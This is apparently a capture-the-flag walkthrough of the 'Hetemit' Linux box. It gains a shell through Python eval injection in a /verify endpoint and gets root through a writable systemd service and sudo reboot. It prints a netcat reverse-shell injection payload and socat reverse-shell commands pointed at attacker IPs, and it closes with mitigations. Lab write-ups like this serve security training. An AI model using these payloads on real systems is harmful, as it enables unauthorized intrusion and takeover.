## Introduction

In this walkthrough, I worked on an **intermediate-level Linux box** from PG Practice named *Hetemit*. While enumerating the web application, I discovered an endpoint (`/verify`) that evaluated arithmetic expressions. The server was using **Werkzeug**, a Python WSGI utility often exposing an interactive debugger in development mode. I successfully **performed command injection** through this endpoint and gained an initial shell. After enumeration, I found that I could **override a systemd service**, and I also had the ability to run `reboot` with `sudo`. By replacing the service content with a **reverse shell script**, I issued a reboot and got a **root shell** upon service restart.

## Nmap

### TCP

```bash
sudo nmap -sV $IP --open
```

### UDP

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n --open
```

## Services

### Port 21

- Searching for public exploits we find `searchsploit vsftpd 3.0`
    
    ![image.png](image%202.png)
    
- Anonymous access is allowed but it hangs to list directory:
    
    ![image.png](image%203.png)
    

### Port 22

We skip SSH for now.

### Port 139/445

```bash
smbclient -L //<RHOST>/ -N
```

![image.png](image%204.png)

```bash
smbclient //$IP/Cmeeks
```

## Web

### Port 80

- Searching for Apache exploits `searchsploit apache 2.4.37`
    
    Nothing found.
    
- Visiting the site we see just default site
- Directory Fuzzing

```bash
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -x .php,.txt
```

Nothing found

### Port 50000

Accessing the page we see 

![image.png](image%206.png)

### Port 18000

![image.png](image%207.png)

I tried to login using default and credentials like `admin:admin`, `admin:no-password`, `admin:password` and tried also `SQL injection` but it seems it does not return success of the query, that’s why I am gonna skip it for now.

There is register too, when going there we see we can register and UPLOAD a file to the server 

![image.png](image%208.png)

Fill:

![image.png](image%209.png)

result:

![image.png](image%2010.png)

So we need to have invite code in order to register.

## Exploitation

```bash
gobuster dir -u http://$IP:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -x .php,.txt
```

Let’s capture the traffic when we visit /generate and /verify directories of the page

![image.png](image%2011.png)

Maybe we should try to send our email and it will return a code and verify can be used to verify that code or something, to change the method to `POST` method right-click on the request and select `“Change request method”`

![image.png](image%2012.png)

![image.png](image%2013.png)

It returned here something so let’s verify it

Moreover we don’t have domain too, that was just a try.

- **Verify**

![image.png](image%2014.png)

![image.png](image%2015.png)

That means at least it tried to do something

**6929ba46f8ff94fbd72a4c5da3f625101c7a164573fbb0a19ddf2804f3033a62**

![image.png](image%2016.png)

But nothing returned:

i tried with ruby reverse shell too, but again didn’t receive anything bacK;

![image.png](image%2017.png)

We should try something else.

![image.png](image%2018.png)

As you can see it returned me a number back, when I used multiplication it evaluates it:

![image.png](image%2019.png)

That likely means that server using Python evaluates expression.

We can perform here command injection, and we know that in order to perform system commands using `Python` we need to use `os` module, let’s try to see if it is present

![image.png](image%2020.png)

Let’s perform command injection now,

![image.png](image%2021.png)

```bash
code=os.system("nc 192.168.45.159 80 -e /bin/bash")
```

Now we have a shell

![image.png](image%2022.png)

Let’s make it interactive using python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

![image.png](image%2023.png)

[sudo-reboot-privilege-escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/)

```bash
socat file:`tty`,raw,echo=0 tcp-listen:139
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.179:139
```

![image.png](image%2024.png)

Now we are root

## Mitigation

- **Remove the use of `eval()`** in `app.py`. Never evaluate user-supplied input directly — instead, safely parse or validate inputs using whitelisting or `ast.literal_eval()` if absolutely needed.
- **Validate the HTTP method** and restrict `/verify` to only accept expected methods (e.g., GET or POST) with properly sanitized input.
- **Disallow dangerous built-ins** like `os.system()` from being accessible through any user input.
- **Secure the `sudo` configuration** by removing `/sbin/reboot` from the list of commands the user can run without a password or ensuring it doesn't allow indirect code execution.
- **Restrict write permissions** to systemd service files. Only trusted users should be able to modify or reload services.
